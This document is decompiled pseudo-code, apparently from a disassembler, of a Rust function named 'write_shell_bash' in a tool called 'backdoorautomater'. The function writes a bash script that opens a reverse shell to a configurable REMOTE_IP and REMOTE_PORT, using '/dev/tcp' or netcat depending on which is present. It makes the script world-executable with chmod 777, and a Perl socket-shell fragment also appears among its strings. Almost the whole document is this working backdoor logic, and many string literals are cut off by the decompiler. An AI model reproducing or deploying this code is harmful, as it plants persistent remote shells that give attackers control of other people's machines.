
  char const (**)[0x94] backdoorautomater::cronshell::write_shell_bash::he63b55dff26362cc(int64_t* arg1, int64_t* arg2, int64_t* arg3)

{
    int32_t var_168;
    std::fs::File::create::he97042899d0016f9(&var_168, arg3);
    char const (** result)[0x94];
    
    if (!var_168)
    {
        int32_t fd_1;
        int32_t fd = fd_1;
        std::process::Command::new::hc59b10cf3f1b2ada(&var_168, 
            "sh-cFailed to execute command*/c…");
        std::process::Command::arg::ha1bca970e684ecbe(
            std::process::Command::arg::ha1bca970e684ecbe(&var_168, 
                "-cFailed to execute command*/cro…"), 
            "ls /bin/ncls /bin/usr/nc#!/bin/b…");
        int128_t var_208;
        std::process::Command::output::hf2f7777b705db8a9(&var_208);
        void var_98;
        core::result::Result$LT$T$C$E$GT$::expect::h4dac3b1149b99667(&var_98, &var_208);
        core::ptr::drop_in_place$LT$std..process..Command$GT$::h60da061aa1df0d14(&var_168);
        std::process::Command::new::hc59b10cf3f1b2ada(&var_168, 
            "sh-cFailed to execute command*/c…");
        std::process::Command::arg::ha1bca970e684ecbe(
            std::process::Command::arg::ha1bca970e684ecbe(&var_168, 
                "-cFailed to execute command*/cro…"), 
            "ls /bin/usr/nc#!/bin/bash\n\nREM…");
        std::process::Command::output::hf2f7777b705db8a9(&var_208);
        void var_60;
        core::result::Result$LT$T$C$E$GT$::expect::h4dac3b1149b99667(&var_60, &var_208);
        core::ptr::drop_in_place$LT$std..process..Command$GT$::h60da061aa1df0d14(&var_168);
        int64_t var_70;
        int64_t var_38;
        
        if (var_70 && var_38)
        {
            char const (** result_2)[0x94] = std::io::Write::write_all::h18f2f3ca7c9bcc20(&fd, 
                "#!/bin/bash\n\nREMOTE_IP="REMOTE…", 0xd);
            result = result_2;
            
            if (result_2)
                goto label_463784;
            
            char const (** result_3)[0x94] = std::io::Write::write_all::h18f2f3ca7c9bcc20(&fd, 
                "/bin/bash -c 'bash -i >& /dev/tc…", 0x22);
            result = result_3;
            
            if (result_3)
                goto label_463784;
            
            char const (** result_4)[0x94] =
                std::io::Write::write_all::h18f2f3ca7c9bcc20(&fd, arg2[1], arg2[2]);
            result = result_4;
            
            if (result_4)
                goto label_463784;
            
            char const (** result_5)[0x94] =
                std::io::Write::write_all::h18f2f3ca7c9bcc20(&fd, &data_5674ac[0x22], 1);
            result = result_5;
            
            if (result_5)
                goto label_463784;
            
            char const (** result_6)[0x94] =
                std::io::Write::write_all::h18f2f3ca7c9bcc20(&fd, arg1[1], arg1[2]);
            result = result_6;
            
            if (result_6)
                goto label_463784;
            
            char const (** result_7)[0x94] =
                std::io::Write::write_all::h18f2f3ca7c9bcc20(&fd, &data_5674ac[0x23], 0x15);
            result = result_7;
            
            if (result_7)
                goto label_463784;
            
            goto label_4637de;
        }
        
        char const (** result_8)[0x94] = std::io::Write::write_all::h18f2f3ca7c9bcc20(&fd, 
            "#!/bin/bash\n\nREMOTE_IP="REMOTE…", 0xd);
        result = result_8;
        
        if (result_8)
            goto label_463784;
        
        var_168 = "REMOTE_IP="REMOTE_PORT=/bin/nc $…";
        int64_t var_160 = 0xb;
        int128_t var_158_1 = *(arg2 + 8);
        alloc::str::join_generic_copy::hc78a65dc4338aaa9(&var_208, &var_168, 2, 1, 0);
        int128_t var_228 = var_208;
        alloc::vec::Vec$LT$T$C$A$GT$::extend_from_slice::h3cce9f7974121c70(&var_228, 
            ""\n\n\nls /bin/ncls /bin/usr/nc#…", 2);
        uint64_t var_1f8;
        char const (** result_9)[0x94] =
            std::io::Write::write_all::h18f2f3ca7c9bcc20(&fd, *var_228[8], var_1f8);
        result = result_9;
        
        if (result_9)
            goto label_463777;
        
        var_168 = "REMOTE_PORT=/bin/nc $REMOTE_IP $…";
        int64_t var_160_1 = 0xc;
        int128_t var_158_2 = *(arg1 + 8);
        alloc::str::join_generic_copy::hc78a65dc4338aaa9(&var_208, &var_168, 2, 1, 0);
        int128_t var_1c8 = var_208;
        alloc::vec::Vec$LT$T$C$A$GT$::extend_from_slice::h3cce9f7974121c70(&var_1c8, 
            "\n\nls /bin/ncls /bin/usr/nc#!/b…", 2);
        char const (** result_10)[0x94] =
            std::io::Write::write_all::h18f2f3ca7c9bcc20(&fd, *var_1c8[8], var_1f8);
        result = result_10;
        char const (** result_11)[0x94];
        
        if (!result_10)
        {
            result_11 = std::io::Write::write_all::h18f2f3ca7c9bcc20(&fd, 
                "/bin/nc $REMOTE_IP $REMOTE_PORT …", 0x3b);
            result = result_11;
        }
        
        if (!result_10 && !result_11)
        {
            core::ptr::drop_in_place$LT$alloc..string..String$GT$::h944c33df58684028(&var_1c8);
            core::ptr::drop_in_place$LT$alloc..string..String$GT$::h944c33df58684028(&var_228);
            label_4637de:
            int64_t zmm0_1 = *(arg3 + 8);
            var_168 = "chmod 777 ;\nuse Socket;\n$p=soc…";
            int64_t var_160_2 = 0xa;
            alloc::str::join_generic_copy::hc78a65dc4338aaa9(&var_208, &var_168, 2, 1, 0);
            int128_t zmm0_6 = var_208;
            std::process::Command::new::hc59b10cf3f1b2ada(&var_168, 
                "sh-cFailed to execute command*/c…");
            int64_t rbp;
            rbp = 1;
            int64_t* rax_8 = std::process::Command::arg::ha1bca970e684ecbe(&var_168, 
                "-cFailed to execute command*/cro…");
            uint64_t var_1f8_1 = var_1f8;
            var_208 = zmm0_6;
            std::process::Command::arg::hc1c88ee68029addc(rax_8, &var_208);
            std::process::Command::output::hf2f7777b705db8a9(&var_208);
            core::result::Result$LT$T$C$E$GT$::expect::h4dac3b1149b99667(&var_1c8, &var_208);
            core::ptr::drop_in_place$LT$std..process..Command$GT$::h60da061aa1df0d14(&var_168);
            int64_t var_1a8;
            size_t var_1a0;
            alloc::string::String::from_utf8_lossy::h7ed9087fa43d10ad(&var_208, var_1a8, var_1a0);
            int64_t rax_9;
            uint64_t rdx_16;
            rax_9 = _$LT$alloc..borrow..Cow$LT$B$GT$$u20$as$u20$core..ops..deref..Deref$GT$::deref::ha2c16a4b1cc76445(&var_208);
            _$LT$T$u20$as$u20$alloc..slice..hack..ConvertVec$GT$::to_vec::h4aa1dd8ab670f689(
                &var_168, rax_9, rdx_16);
            int64_t var_218_2 = zmm0_1;
            var_228 = var_168;
            core::ptr::drop_in_place$LT$alloc..borrow..Cow$LT$str$GT$$GT$::hb5385058f177b775(
                &var_208);
            backdoorautomater::sanitizer::sanitize_system_command::hc9c6071c8b9b108c(&var_228);
            core::ptr::drop_in_place$LT$alloc..string..String$GT$::h944c33df58684028(&var_228);
            core::ptr::drop_in_place$LT$std..process..Output$GT$::h78d1e539beaf0e46(&var_1c8);
            core::ptr::drop_in_place$LT$std..process..Output$GT$::h78d1e539beaf0e46(&var_60);
            core::ptr::drop_in_place$LT$std..process..Output$GT$::h78d1e539beaf0e46(&var_98);
            core::ptr::drop_in_place$LT$std..fs..File$GT$::hb99078073e1bf56b(fd);
            core::ptr::drop_in_place$LT$alloc..string..String$GT$::h944c33df58684028(arg3);
            core::ptr::drop_in_place$LT$alloc..string..String$GT$::h944c33df58684028(arg2);
            result = nullptr;
        }
        else
        {
            core::ptr::drop_in_place$LT$alloc..string..String$GT$::h944c33df58684028(&var_1c8);
            label_463777:
            core::ptr::drop_in_place$LT$alloc..string..String$GT$::h944c33df58684028(&var_228);
            label_463784:
            core::ptr::drop_in_place$LT$std..process..Output$GT$::h78d1e539beaf0e46(&var_60);
            core::ptr::drop_in_place$LT$std..process..Output$GT$::h78d1e539beaf0e46(&var_98);
            core::ptr::drop_in_place$LT$std..fs..File$GT$::hb99078073e1bf56b(fd);
            core::ptr::drop_in_place$LT$alloc..string..String$GT$::h944c33df58684028(arg3);
            core::ptr::drop_in_place$LT$alloc..string..String$GT$::h944c33df58684028(arg2);
        }
    }
    else
    {
        char const (** result_1)[0x94];
        result = result_1;
        core::ptr::drop_in_place$LT$alloc..string..String$GT$::h944c33df58684028(arg3);
        core::ptr::drop_in_place$LT$alloc..string..String$GT$::h944c33df58684028(arg2);
    }
    
    core::ptr::drop_in_place$LT$alloc..string..String$GT$::h944c33df58684028(arg1);
    return result;
}
